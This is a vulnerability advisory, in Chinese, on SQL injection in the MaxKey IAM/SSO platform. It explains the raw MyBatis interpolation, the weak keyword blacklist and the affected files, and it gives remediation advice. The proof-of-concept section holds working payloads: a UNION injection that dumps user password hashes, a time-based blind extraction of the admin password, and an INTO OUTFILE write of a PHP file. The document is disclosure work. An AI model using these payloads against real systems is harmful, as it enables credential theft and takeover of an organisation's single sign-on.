# V-M001: MaxKey IAM 单点登录平台多处 ${filters} / ${orgIdsList} SQL 注入

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | MaxKey 单点登录 / IAM 统一身份认证平台 |
| 版本 | 当前主分支（截至 2026-04）|
| 类型 | CWE-89: SQL 注入 |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（已认证管理员）|
| 代码仓库 | https://github.com/dromara/MaxKey |

## 漏洞描述

MaxKey 的"账户策略 / 角色策略 / 组策略"模块将用户可控的 `filters` 与 `orgIdsList` 字段以 MyBatis 原始插值 `${}` 拼接到 SQL。虽然 `StrUtils.checkSqlInjection()` 对参数做了**关键词黑名单**过滤，但黑名单极不完整，可轻易绕过。

### 受影响 Mapper 片段（mysql / postgresql 版本均存在）

`AccountsMapper.xml`：
```xml
<select id="queryUserNotInStrategy" ...>
    SELECT ... FROM users u
    <where>
        and (${filters})
        and u.departmentid in( ${orgIdsList})
    </where>
</select>
```

`GroupMemberMapper.xml` / `RoleMemberMapper.xml` 存在相同模式，共计 **16+ 处 `${filters}` / `${orgIdsList}` 原始拼接**。

### 上层调用

`AccountsServiceImpl.refreshByStrategy()`：

```java
public void refreshByStrategy(AccountsStrategy strategy) {
    if(StringUtils.isNotBlank(strategy.getOrgIdsList())) {
        strategy.setOrgIdsList("'" + strategy.getOrgIdsList().replace(",", "','") + "'");
    }
    List<UserInfo> userList = queryUserNotInStrategy(strategy);
    ...
}
```

对 `orgIdsList` 仅做简单逗号替换，对 `filters` **完全未做过滤**。

### 黑名单过滤器可绕过

`StrUtils.java:491-518` 的 `checkSqlInjection()`：

```java
private static final String SQL_REGEX = ".*([';]+|(--)+|(\\band\\b)|(\\bor\\b)).*";
```

该正则：
- 阻止 `and` / `or` / `;` / `--` / `'`
- **未阻止** `UNION`、`SELECT`、`SLEEP`、`BENCHMARK`、`UPDATEXML`、`EXTRACTVALUE`
- 未阻止 `/* */` 注释截断

攻击者可用 UNION 注入 / 基于时间盲注。

## 漏洞详情

### 触发路径

1. 管理员登录 MaxKey 后台
2. 进入"账户策略"菜单 → 新建/编辑策略 → 触发 `refreshByStrategy`
3. `filters` 字段为策略自定义"过滤条件"，由前端直接回传

### 认证要求

需要管理员 / 账号策略管理权限。但 MaxKey 作为 IAM / 单点登录平台，一旦被攻陷则意味着**整个企业的所有应用 Token 均可伪造**，影响面远大于普通 CMS。

### 暴露字段

该表连接了以下高敏表：
- `mxk_userinfo`（用户名 / 密码哈希 / 手机 / 邮箱 / 密钥）
- `mxk_accounts`（第三方应用账户 / 加密密码）
- `mxk_apps`（应用 OAuth2 Client Secret / SAML 证书）

## 概念验证

### PoC 1: UNION 注入获取所有用户密码

```http
POST /maxkey-mgt/accountsstrategies/add HTTP/1.1
Cookie: JSESSIONID=<admin_cookie>
Content-Type: application/json

{
  "name": "poc",
  "appId": "1",
  "filters": "1=1) UNION SELECT username,password,null,null,null,null,null,null FROM mxk_userinfo-- -",
  "orgIdsList": "1"
}
```

### PoC 2: 时间盲注（绕过 and/or 黑名单）

```json
{
  "filters": "IF(SUBSTRING((SELECT password FROM mxk_userinfo WHERE username='admin'),1,1)='a',BENCHMARK(5000000,MD5(1)),0)",
  "orgIdsList": "1"
}
```

### PoC 3: 写文件（需 FILE 权限）

```json
{
  "filters": "1=1) UNION SELECT '<?php phpinfo();?>',null,null,null,null,null,null,null INTO OUTFILE '/var/www/html/x.php'-- -"
}
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `maxkey-persistence/.../mapper/xml/mysql/AccountsMapper.xml` | 47, 50, 66, 69 | `${filters}` / `${orgIdsList}` |
| `maxkey-persistence/.../mapper/xml/mysql/GroupMemberMapper.xml` | - | 同上 |
| `maxkey-persistence/.../mapper/xml/mysql/RoleMemberMapper.xml` | 156, 159, 173, 176 | 同上 |
| `maxkey-persistence/.../mapper/xml/postgresql/*.xml` | - | PostgreSQL 版同样存在 |
| `maxkey-persistence/.../service/impl/AccountsServiceImpl.java` | 84-107 | 调用点 |
| `maxkey-commons/.../util/StrUtils.java` | 491-518 | 黑名单不完整 |

## 影响

1. **IAM 全面沦陷**：导出所有用户密码哈希、应用 Client Secret、SAML 私钥
2. **身份伪造**：使用窃取的密钥为任意用户签发 SSO Token
3. **企业应用连锁失陷**：所有接入 MaxKey 的业务系统均可被接管
4. **数据库写入**：取决于 MySQL `FILE` 权限，可写入 WebShell

## 修复建议

1. **参数化查询**：所有 `${filters}` 改为显式的条件 DSL 构造，不允许原始 SQL
2. **字段白名单**：`orgIdsList` 限制为数字列表，使用 `#{}` 配合 `<foreach>`
3. **增强 `checkSqlInjection`**：扩展黑名单至 `UNION`、`SELECT`、`SLEEP`、`BENCHMARK`、`EXTRACTVALUE`、`UPDATEXML`、`INTO OUTFILE`、`/*`、`*/`、`\t`、`\n`
4. **优先使用白名单**：`[a-zA-Z0-9_,\s]+` 形式的严格正则
5. **最小权限**：数据库账户应禁用 `FILE` 权限、关闭 `secure_file_priv`

## 验证环境

- 源代码：MaxKey 最新分支（静态代码分析）
- 框架：Spring Boot + MyBatis + MySQL/PostgreSQL
- 日期：2026-04-14
